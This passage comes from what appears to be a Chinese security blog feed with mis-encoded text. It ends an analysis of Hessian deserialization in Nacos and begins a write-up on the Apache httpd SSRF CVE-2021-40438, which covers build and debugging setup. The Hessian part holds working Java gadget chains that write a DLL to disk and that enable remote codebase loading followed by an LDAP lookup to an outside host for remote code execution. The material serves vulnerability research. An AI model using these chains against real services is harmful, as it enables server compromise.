java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaUtilsWriteFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Payload.run(getUtilsWriteFileObject());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">getUtilsWriteFileObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\calc.dll&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:\\calc-result.dll&quot;</span>;<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<br>                <span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>,<br>                <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;fileName,bytes&#125;);<br>        Object[] keyValueList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;abc&quot;</span>,swingLazyValue&#125;;<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList);<br><br>        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        hashtable1.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults1);<br>        hashtable2.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults2);<br>        <span class="hljs-keyword">return</span> MakeUtils.makeMap(hashtable1,hashtable2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è°ƒç”¨æ ˆï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">writeBytesToFilename:</span><span class="hljs-number">85</span>, JavaUtils (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xml.internal.security.utils)<br>invokeè°ƒç”¨<br><span class="hljs-symbol">createValue:</span><span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<br><span class="hljs-symbol">getFromHashtable:</span><span class="hljs-number">216</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">get:</span><span class="hljs-number">161</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">815</span>, Hashtable (java.util)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">815</span>, Hashtable (java.util)<br><span class="hljs-symbol">putVal:</span><span class="hljs-number">636</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">613</span>, HashMap (java.util)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">114</span>, MapDeserializer (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">577</span>, SerializerFactory (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">1160</span>, HessianInput (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure><h5 id="3-3-4-System-setProperty-JNDI"><a href="#3-3-4-System-setProperty-JNDI" class="headerlink" title="3.3.4 System.setProperty + JNDI"></a>3.3.4 System.setProperty + JNDI</h5><p>jdkä¸­è®¾ç½®ç¯å¢ƒå˜é‡å¾—æ–¹æ³•java.lang.System#setPropertyæ˜¯é™æ€æ–¹æ³•ï¼Œç¬¦åˆSwingLazyValue#createValueè°ƒç”¨çš„æ¡ä»¶ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨setPropertyå¤æ´»é«˜ç‰ˆæœ¬ä¸‹çš„JNDIæ³¨å…¥ï¼ŒJNDIæ³¨å…¥å¯å‚è€ƒï¼š <a href="https://pwnull.github.io/2022/jndi-injection-history/">https://pwnull.github.io/2022/jndi-injection-history/</a></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import org.utils.MakeUtils;<br>import org.utils.Payload;<br>import sun.swing.SwingLazyValue;<br>import javax.swing.*;<br>import java.util.HashMap;<br>import java.util.Hashtable;<br><br>public <span class="hljs-keyword">class</span> SetPropertyJndi &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    System.setProperty + InitalContext.doLookup</span><br><span class="hljs-comment">     */</span><br>    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;<br>        String className = <span class="hljs-string">&quot;java.lang.System&quot;</span>;<br>        String methodName = <span class="hljs-string">&quot;setProperty&quot;</span>;<br>        String<span class="hljs-literal">[]</span> args1 = &#123;<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>&#125;;<br>        String<span class="hljs-literal">[]</span> args2 = &#123;<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>&#125;;<br>        String<span class="hljs-literal">[]</span> args3 = &#123;<span class="hljs-string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>&#125;;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-params">className</span>,<span class="hljs-params">methodName</span>,<span class="hljs-params">args1</span>)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-params">className</span>,<span class="hljs-params">methodName</span>,<span class="hljs-params">args2</span>)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-params">className</span>,<span class="hljs-params">methodName</span>,<span class="hljs-params">args3</span>)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run(get<span class="hljs-constructor">SetPropertyJndiObject(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>,<span class="hljs-string">&quot;doLookup&quot;</span>,<span class="hljs-params">new</span> Object[]&#123;<span class="hljs-string">&quot;ldap://192.168.232.238:9999/rceexp&quot;</span>&#125;)</span>);<br>    &#125;<br>    public static HashMap&lt;Object, Object&gt; get<span class="hljs-constructor">SetPropertyJndiObject(String <span class="hljs-params">className</span>,String <span class="hljs-params">methodName</span>,Object[] <span class="hljs-params">args</span>)</span> throws Exception &#123;<br>        SwingLazyValue swingLazyValue = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-params">className</span>, <span class="hljs-params">methodName</span>, <span class="hljs-params">args</span>)</span>;<br>        Object<span class="hljs-literal">[]</span> keyValueList = <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;abc&quot;</span>,swingLazyValue&#125;;<br>        UIDefaults uiDefaults1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults(<span class="hljs-params">keyValueList</span>)</span>;<br>        UIDefaults uiDefaults2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults(<span class="hljs-params">keyValueList</span>)</span>;<br><br>        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="hljs-keyword">new</span> Hashtable&lt;&gt;<span class="hljs-literal">()</span>;<br>        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="hljs-keyword">new</span> Hashtable&lt;&gt;<span class="hljs-literal">()</span>;<br>        hashtable1.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults1);<br>        hashtable2.put(<span class="hljs-string">&quot;a&quot;</span>,uiDefaults2);<br>        return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MakeUtils</span>.</span></span>make<span class="hljs-constructor">Map(<span class="hljs-params">hashtable1</span>,<span class="hljs-params">hashtable2</span>)</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/40.png"></p><p>è°ƒè¯•çœ‹åˆ°é«˜ç‰ˆæœ¬JDKä¸‹çš„trustURLCodebaseã€useCodebaseOnlyå˜é‡å·²æˆåŠŸä¿®æ”¹</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String env=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;java.runtime.version&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;<br>env<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/41.png"></p><p>å¦å¤–è¿˜æœ‰å‡ ä¸ªæ–¹æ³•ï¼Œæ•ˆæœä¸ä¸Šé¢åˆ†æçš„ç±»ä¼¼ï¼Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾åˆ†æ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">DumpBytecode<span class="hljs-selector-class">.dumpBytecode</span> + System<span class="hljs-selector-class">.load</span>   å†™å…¥æ–‡ä»¶+System.loadè°ƒç”¨<br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xslt</span><span class="hljs-selector-class">.Process</span>._main <br>sun<span class="hljs-selector-class">.tools</span><span class="hljs-selector-class">.jar</span><span class="hljs-selector-class">.Main</span><span class="hljs-selector-class">.main</span><br>System<span class="hljs-selector-class">.setProperty</span> + jdk<span class="hljs-selector-class">.jfr</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.Utils</span><span class="hljs-selector-class">.writeGeneratedAsm</span>  openjdk<br></code></pre></td></tr></table></figure><p>å¦å¤–åœ¨åˆ†æHessiané“¾ä¸­ï¼Œéœ€è¦æ³¨æ„çš„é—®é¢˜æ˜¯IDEAåœ¨è°ƒè¯•æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨toStringæ–¹æ³•æ‰“å°å­—ç¬¦ä¸²ï¼Œè€Œåˆ†æçš„é“¾æ­£æ˜¯åŸºäºtoStringï¼Œæå‰è°ƒç”¨ä¼šå¼•å‘é”™è¯¯ï¼Œè§£å†³æ–¹æ¡ˆæ˜¯åœ¨è®¾ç½®ä¸­å–æ¶ˆå‹¾é€‰çº¢æ¡†é€‰é¡¹</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/42.png"></p><h2 id="4ã€æ€»ç»“"><a href="#4ã€æ€»ç»“" class="headerlink" title="4ã€æ€»ç»“"></a>4ã€æ€»ç»“</h2><p>çºµè§‚è¿‘ä¸¤å¹´å‡ºç°é£é™©è¾ƒå¤§çš„æ¼æ´ï¼Œå¸¸è§çš„èƒ½å¤Ÿä¸€å‘å…¥é­‚ã€ç›´æ¥é€šå¾€RCEçš„WEBæ¼æ´è‚‰çœ¼å¯è§çš„å˜å°‘ï¼Œéšä¹‹æ›¿ä»£çš„æ˜¯å„ç§åè®®é—®é¢˜ã€è¿œç¨‹RPCæ–¹æ³•è°ƒç”¨ã€ä¸‰æ–¹ä¾èµ–åŒ…æ±¡æŸ“ã€æ¡†æ¶åº•å±‚å‡½æ•°é—®é¢˜ç­‰åˆ©ç”¨æ‰‹æ³•ã€‚å®‰å…¨æŠ€æœ¯5å¹´ä¸€æ›´æ–°ï¼Œè¿‘å‡ å¹´è¢«HWå¸¦ç«çš„JAVAå®‰å…¨é¢†åŸŸï¼Œå›½å†…çš„å¸ˆå‚…å‡ ä¹æŠŠèƒ½å·çš„äº§å“&#x2F;ç»„ä»¶&#x2F;æ¡†æ¶éƒ½å·äº†ä¸ªéï¼ŒåƒWeblogic&#x2F;Struts2&#x2F;Spring&#x2F;Log4J&#x2F;Apache&#x2F;Xstreamç­‰å¤§å‹æ¡†æ¶&#x2F;ç»„ä»¶çš„æ¼æ´ç ´è§£ï¼ŒJDBC&#x2F;å†…å­˜é©¬&#x2F;åˆ©ç”¨å›æ˜¾&#x2F;shellå…æ€ç­‰æŠ€æœ¯éåœ°å¼€èŠ±ã€‚è¿™è®©æ¯ä¸ªæƒ³å…¥é—¨JAVAå®‰å…¨çš„æ–°æ‰‹éƒ½èƒ½æœè§å¦‚å±±çš„èµ„æ–™ï¼Œåªè¦æ„¿æ„æŠ•å…¥æ—¶é—´ï¼Œå¤šä¸Šæ‰‹è°ƒä»£ç ï¼Œå°±èƒ½æŒæ¡å¥½è¿™äº›æŠ€æœ¯ã€‚</p><p>é‚£ä¹ˆä»€ä¹ˆæ˜¯å®‰å…¨æŠ€æœ¯çš„æ ¸å¿ƒï¼Ÿä»€ä¹ˆæ ·çš„å®‰å…¨æŠ€æœ¯ï¼Œèƒ½æŒç»­3-5å¹´ç”šè‡³10å¹´ï¼Ÿè¿™äº›å®‰å…¨æŠ€æœ¯èƒ½ç»™ä¼ä¸šå¸¦æ¥ä»€ä¹ˆä¿éšœï¼Ÿ</p><p>å½’çº³æ€»ç»“ã€è§¦ç±»æ—é€šï¼Œå¤§èƒ†å‡è®¾ï¼Œå°å¿ƒæ±‚è¯~</p><h2 id="5ã€å‚è€ƒ"><a href="#5ã€å‚è€ƒ" class="headerlink" title="5ã€å‚è€ƒ"></a>5ã€å‚è€ƒ</h2><p><a href="https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html">https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html</a></p><p><a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk/writeup">https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk/writeup</a></p><p><a href="https://l1nyz-tel.cc/2023/1/10/0ctf2022-hessian-onlyjdk/">https://l1nyz-tel.cc/2023/1/10/0ctf2022-hessian-onlyjdk/</a></p><p><a href="http://miku233.viewofthai.link/2022/10/13/0ctf-hessian-onlyjdk/">http://miku233.viewofthai.link/2022/10/13/0ctf-hessian-onlyjdk/</a></p><p><a href="https://guokeya.github.io/post/psaIZKtC4/">https://guokeya.github.io/post/psaIZKtC4/</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´è¿½è¸ª</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¼æ´åˆ†æ</tag>
      
      <tag>Nacos</tag>
      
      <tag>RPC</tag>
      
      <tag>Hessian</tag>
      
      <tag>ååºåˆ—åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»HTTPD-SSRF CVE-2021-40438èµ·æ‰‹çš„RCEæ¼æ´æŒ–æ˜</title>
    <link href="/2023/From-apache-httpd-ssrf-cve-2021-40438-to-Rce/"/>
    <url>/2023/From-apache-httpd-ssrf-cve-2021-40438-to-Rce/</url>
    
    <content type="html"><![CDATA[<p>Apacheå®˜æ–¹åœ¨ 2021-09-16æ›´æ–°å‘å¸ƒApache Httpd 2.4.49ç‰ˆæœ¬ï¼Œåœ¨è¿™ä¸ªç‰ˆæœ¬ä¸­ä¿®å¤äº†CVE-2021-40438ã€CVE-2021-33193ã€CVE-2021-34798ã€CVE-2021-36160ã€ CVE-2021-39275ç­‰5ä¸ªæ¼æ´ã€‚å…¶ä¸­CVE-2021-40438 ä¸ºmod_proxyæ¨¡å—ä¸‹çš„SSRFæ¼æ´ï¼Œå½±å“ç‰ˆæœ¬ä¸º2.4.48åŠä»¥ä¸‹ã€‚æ ¹æ®å®˜æ–¹æè¿°æ¥çœ‹æ­¤æ¼æ´æ˜¯Apacheå†…éƒ¨å®‰å…¨å›¢é˜Ÿåœ¨åˆ†æCVE-2021-36160   mod_proxy_uwsg  DoS æ—¶æ— æ„å‘ç°çš„ï¼Œç”±äºmod_proxyæ¨¡å—ä¸ºApache HTTP Serverå®ç°äº†åŸºç¡€ä»£ç†&#x2F;ç½‘å…³åŠŸèƒ½ï¼Œæ”¯æŒå¾ˆå¤šå¸¸è§åè®®å¦‚httpã€ajpã€fastcgiã€ftpç­‰ï¼Œæ‰€ä»¥è¯¥æ¨¡å—åœ¨å¾ˆå¤šé€šç”¨ç³»ç»Ÿä¸­éƒ½ä¼šä½¿ç”¨åˆ°ï¼Œæ¼æ´çš„å½±å“èŒƒå›´æ˜¯ç›¸å½“å¹¿çš„ã€‚</p><p>å¦å¤–ç¬”è€…åœ¨åç»­å¯¹å¤šä¸ªä½¿ç”¨mod_proxyæ¨¡å—çš„å¤§å‹åº”ç”¨ç³»ç»Ÿåˆ†ææ—¶ï¼Œå¤§éƒ¨åˆ†éƒ½å­˜åœ¨æ­¤å®‰å…¨é—®é¢˜ï¼Œä¸”å¦‚æœå¯ä»¥æ‰¾åˆ°å­˜åœ¨æ•æ„ŸåŠŸèƒ½çš„åç«¯Unix Domain Socket&#x2F;æœ¬åœ°æœåŠ¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨ä»£ç†æ¼æ´è¯·æ±‚åç«¯æ•æ„ŸæœåŠ¡ ç»„åˆä¸²è”æœ€ç»ˆè¾¾æˆRCEçš„æ•ˆæœã€‚æœ¬æ–‡åªåšæ€è·¯åˆ†äº«ã€æŠ€æœ¯äº¤æµï¼Œä¸æä¾›ä»»ä½•å½¢å¼çš„EXPï¼</p><p>æ–‡ç« å‰åŠéƒ¨åˆ†ä¸ºApache Httpdçš„è°ƒè¯•ç¯å¢ƒæ­å»ºä¸æ¼æ´åˆ†æï¼ŒååŠéƒ¨åˆ†æ˜¯å¯¹è¯¥æ¼æ´åœ¨å®é™…æŒ–æ˜åœºæ™¯ä¸­çš„ä¸€äº›æ€è€ƒä¸æ€»ç»“ã€‚ å¦‚æœå¯¹æ–‡ç« æœ‰ç–‘é—®&#x2F;å»ºè®®æˆ–è€…æƒ³ä¸€èµ·ç ”ç©¶äº¤æµçš„å¸ˆå‚…ï¼Œæ¬¢è¿ç§ä¿¡ğŸ˜œ </p><p> <strong>PSï¼šæœ¬æ–‡ä»…ç”¨äºæŠ€æœ¯è®¨è®ºã€‚ä¸¥ç¦ç”¨äºä»»ä½•éæ³•ç”¨é€”ï¼Œè¿è€…åæœè‡ªè´Ÿã€‚</strong> </p><h2 id="1ã€å®‰è£…éƒ¨ç½²"><a href="#1ã€å®‰è£…éƒ¨ç½²" class="headerlink" title="1ã€å®‰è£…éƒ¨ç½²"></a>1ã€å®‰è£…éƒ¨ç½²</h2><p>æœ¬æ¬¡æ¼”ç¤ºéƒ¨ç½²äº†2.4.43ç‰ˆæœ¬çš„Apache Httpdï¼Œå¹¶ä¸”ä½¿ç”¨vscodeè¿œç¨‹è°ƒè¯•linuxä¸‹çš„Apache HttpdæœåŠ¡ã€‚è¿™éƒ¨åˆ†å†…å®¹å‚è€ƒäº†På¸ˆå‚…æ˜Ÿçƒçš„æ–‡ç« ï¼š<a href="https://t.zsxq.com/RvfmEu3">https://t.zsxq.com/RvfmEu3</a> ã€<a href="https://t.zsxq.com/7qNfeie">https://t.zsxq.com/7qNfeie</a>   è‡´æ•¬æ„Ÿè°¢åˆ†äº«ï¼ </p><h3 id="1-1-linuxéƒ¨ç½²ç¯å¢ƒ"><a href="#1-1-linuxéƒ¨ç½²ç¯å¢ƒ" class="headerlink" title="1.1 linuxéƒ¨ç½²ç¯å¢ƒ"></a>1.1 linuxéƒ¨ç½²ç¯å¢ƒ</h3><p>ä¸‹è½½2.4.43ç‰ˆæœ¬çš„æºç è‡ªè¡Œç¼–è¯‘ï¼Œå¦å¤–æ­¤æ¬¡æ¼æ´æ¶‰åŠåˆ°äº†aprã€apr-utilçš„å‡½æ•°ï¼Œæ‰€ä»¥apacheåœ¨æŒ‡å®šç¼–è¯‘æ—¶éœ€è¦æŒ‡å®šaprå’Œaprutil</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span>-get install build-essential gdb <br><span class="hljs-attribute">apt</span>-get install --no-install-recommends libapr1-dev libaprutil1-dev libpcre3-dev<br><br><span class="hljs-attribute">https</span>://archive.apache.org/dist/httpd/  <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">43</span><br><span class="hljs-attribute">https</span>://downloads.apache.org/apr/   ä¸‹è½½apr-<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">5</span>.tar.gz  apr-util-<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.tar.gz<br><br><span class="hljs-attribute">tar</span> -zxvf apr-<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">5</span>.tar.gz<br><span class="hljs-attribute">tar</span> -zxvf apr-util-<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.tar.gz<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/root/m</span>ake-tools/apr-<span class="hljs-number">1.6</span>.<span class="hljs-number">5</span>&gt;<br>CFLAGS=<span class="hljs-string">&quot;-g&quot;</span> .<span class="hljs-regexp">/configure --prefix=/</span>root<span class="hljs-regexp">/apache-ext/</span>apr<br>make &amp;&amp; make install<br><br><span class="hljs-regexp">/root/m</span>ake-tools/apr-util-<span class="hljs-number">1.6</span>.<span class="hljs-number">1</span>&gt;<br>CFLAGS=<span class="hljs-string">&quot;-g&quot;</span> .<span class="hljs-regexp">/configure --prefix=/</span>root<span class="hljs-regexp">/apache-ext/</span>apr-util --with-apr=<span class="hljs-regexp">/root/</span>apache-ext/apr<br>make &amp;&amp; make install<br><br><br>ç¼–è¯‘httpdï¼š<br><span class="hljs-regexp">/root/</span>apache/httpd-<span class="hljs-number">2.4</span>.<span class="hljs-number">43</span>&gt;<br>CFLAGS=<span class="hljs-string">&quot;-g&quot;</span> .<span class="hljs-regexp">/configure --prefix=/</span>root<span class="hljs-regexp">/apache/</span>httpd-bin --with-apr=<span class="hljs-regexp">/root/</span>apache-ext<span class="hljs-regexp">/apr --with-apr-util=/</span>root<span class="hljs-regexp">/apache-ext/</span>apr-util<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/1.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/2.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/3.png"></p><p>ç¼–è¯‘å®Œæˆåå¼€å§‹é…ç½®<code>httpd-bin/conf/httpd.conf</code>ï¼Œå°†proxy_module.soå’Œmod_proxy_http.soæ³¨é‡Šå»æ‰ï¼Œä¸”åœ¨æ–‡ä»¶æœ«å°¾å¢åŠ å¦‚ä¸‹é…ç½®</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-params">&lt;VirtualHost *&gt;</span><br>   ServerAdmin webmaster@localhost<br>   ServerName <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>   DocumentRoot <span class="hljs-keyword">/root/</span>apache<span class="hljs-keyword">/httpd-plus/</span>htdocs<br>   LogLevel notice proxy:trace8<br>   ErrorLog <span class="hljs-keyword">/root/</span>apache<span class="hljs-keyword">/httpd-plus/</span>logs/error.log<br>   CustomLog <span class="hljs-keyword">/root/</span>apache<span class="hljs-keyword">/httpd-plus/</span>logs/access.log combined<br>   ProxyPass /link <span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span><br>   ProxyPassReverse /link <span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span><br><span class="hljs-params">&lt;/VirtualHost&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/4.png"></p><h3 id="1-2-è¿œç¨‹è°ƒè¯•Httpd"><a href="#1-2-è¿œç¨‹è°ƒè¯•Httpd" class="headerlink" title="1.2 è¿œç¨‹è°ƒè¯•Httpd"></a>1.2 è¿œç¨‹è°ƒè¯•Httpd</h3><p>vscodeæ’ä»¶ä¸‹è½½åœ°å€ï¼š<br><a href="https://marketplace.visualstudio.com/search?term=remote&amp;target=VSCode">https://marketplace.visualstudio.com/search?term=remote&amp;target=VSCode</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/5.png"></p><p>ç„¶åå®‰è£…ä¸€ä¸‹è°ƒè¯•Cæ—¶æ‰€éœ€è¦çš„VSCodeæ‰©å±•ï¼š</p><p><a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools">https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools</a> </p><p>ç¦»çº¿å®‰è£…remote-sshæ’ä»¶</p><p><a href="https://www.cnblogs.com/litaozijin/p/13202992.html">https://www.cnblogs.com/litaozijin/p/13202992.html</a></p><p>åœ¨vscodeè°ƒè¯•ç•Œé¢åˆ›å»ºé…ç½®æ–‡ä»¶ launch.json</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 